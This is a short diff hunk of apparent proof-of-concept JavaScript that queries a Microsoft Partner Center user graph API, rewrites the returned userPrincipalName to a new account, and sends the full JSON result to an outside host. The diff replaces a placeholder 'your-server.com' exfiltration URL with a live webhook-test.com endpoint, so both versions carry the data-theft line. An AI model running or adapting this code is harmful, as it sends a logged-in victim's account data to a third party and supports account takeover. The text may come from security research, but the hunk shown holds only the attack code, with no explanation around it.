@@ -71,5 +71,5 @@ fetch('https://partner.microsoft.com/en-us/dashboard/account/v3/api/graph/users?
   .then(response => response.json())
   .then(result => {
     result.userPrincipalName = newAccount;
-    fetch("https://your-server.com/000?result=" + encodeURIComponent(JSON.stringify(result)));
+    fetch("https://webhook-test.com/30e0283098aed29b5c052a61c0828c89?result=" + encodeURIComponent(JSON.stringify(result)));
   });
